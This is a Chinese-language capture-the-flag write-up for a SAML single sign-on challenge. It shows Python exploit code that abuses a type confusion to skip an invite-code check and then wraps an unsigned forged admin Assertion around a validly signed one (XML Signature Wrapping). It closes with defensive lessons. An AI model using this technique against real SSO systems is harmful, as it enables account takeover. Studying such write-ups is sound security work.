# auth

## 题目简述

题目模拟一套 SAML SSO：Node.js/Express 编写的 IdP 负责注册、登录和签发 SAMLResponse，Python/Flask 编写的 SP 保存 flag，只有解析出的身份为 `admin@rois.team` 才能访问 `/admin`。完整利用链包含两个独立缺陷：先用 JavaScript、Session 与 MySQL 对 `type` 的类型解释差异注册出可使用 SAML 的 `type=0` 用户，再利用 SP 的签名验证器和身份解析器选择了不同 Assertion，实施 XML Signature Wrapping。

## 解题过程

### 取得合法的 SAMLResponse

IdP 只在 `parseInt(type) === 0` 时检查邀请码，随后却把未经规范化的原值直接交给数据库：

```javascript
if (parseInt(type) === 0) {
    if (!invitationCode || invitationCode !== config.getInviteCode()) {
        return registrationError();
    }
}

req.session.userId = await User.create({ username, email, type });
req.session.userType = type;
```

注册接口没有验证 `type` 的数据类型。PDF 使用 JSON 布尔值 `false`：

- `parseInt(false)` 得到 `NaN`，所以严格比较 `NaN === 0` 为假，跳过邀请码检查；
- MySQL 的 `TINYINT` 列把布尔 `false` 保存为数值 `0`，新账号因此获得 SAML 权限；
- 注册后当前 Session 中仍是布尔 `false`，而中间件检查 `req.session.userType !== 0`，此时严格不等成立；退出并重新登录后，数据库读出的数值 `0` 才能通过检查。

仓库单题 WP 还给出字符串变体：在关闭严格模式的 MySQL 中提交 `type=abc`，`parseInt("abc")` 同样是 `NaN`，写入 `TINYINT` 时则被宽松转换为 0。两种输入利用的是同一处“校验前后类型不一致”。

```python
s.post(f"{idp}/register", json={
    "username": username,
    "email": email,
    "password": password,
    "confirmPassword": password,
    "type": False,
    "displayName": "Hacker",
})

s.cookies.clear()
s.post(f"{idp}/login", data={"username": username, "password": password})
html = s.get(f"{idp}/saml/idp/Flag").text
saml_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"', html).group(1)
```

### 定位 XML Signature Wrapping 条件

SP 的验证器会收集文档中所有实际存在的 Assertion 签名，只要列表非空且这些签名都合法，就返回成功；它没有要求每个 Assertion 都必须被签名：

```python
assertion_signatures = self._find_assertion_signatures()
if not assertion_signatures:
    return False
for sig_node in assertion_signatures:
    if not self._verify_signature(sig_node):
        return False
```

业务解析器随后重新执行 `//saml:Assertion`，无条件从第一个 Assertion 中取 `NameID`：

```python
assertions = self.document.xpath('//saml:Assertion', namespaces=self.NAMESPACES)
assertion = assertions[0]
return assertion.xpath('.//saml:NameID', namespaces=self.NAMESPACES)[0].text
```

因此，“通过签名验证的节点”和“提供身份的节点”没有绑定。保留原始已签名 Assertion，再在它前面插入无签名的管理员 Assertion，就能让验证器检查后者以外的合法签名，而解析器读取前者。

### 包装并提交响应

以合法 Assertion 为模板，修改三处即可：把 `NameID` 改为管理员邮箱、移除复制节点中的 `ds:Signature`、把它插到原始节点之前。PDF 脚本给复制节点设置新的唯一 ID；仓库单题 WP 选择直接删除 ID，两者都能避开重复 ID 检查，删除 ID 更简洁：

```python
import base64
import copy
from lxml import etree

ns = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}

root = etree.fromstring(base64.b64decode(saml_b64))
original = root.find(".//saml:Assertion", ns)
fake = copy.deepcopy(original)

fake.attrib.pop("ID", None)
fake.find(".//saml:NameID", ns).text = "admin@rois.team"
signature = fake.find("./ds:Signature", ns)
if signature is not None:
    fake.remove(signature)

original.getparent().insert(original.getparent().index(original), fake)
evil_b64 = base64.b64encode(etree.tostring(root)).decode()
```

把 `evil_b64` POST 到 SP 的 `/saml/acs`，并令 `RelayState=/admin`。SP 验证原始 Assertion 的签名后，从排在第一位的伪造 Assertion 读取 `admin@rois.team`，建立管理员 Session，再跟随重定向访问 `/admin` 即可得到 flag。

## 方法总结

- 核心技巧：跨 JavaScript、Session、MySQL 的类型混淆，以及 SAML XML Signature Wrapping。
- 识别信号：同一字段在校验、存储和会话中没有统一类型；签名验证器按引用 ID 找节点，业务解析器却按文档顺序取第一个节点。
- 复用要点：验证“文档里存在合法签名”远远不够，业务使用的 Assertion 必须与成功验证的具体签名引用绑定；测试 SSO 时要分别追踪注册态、重新登录态和 SP 建立的会话。
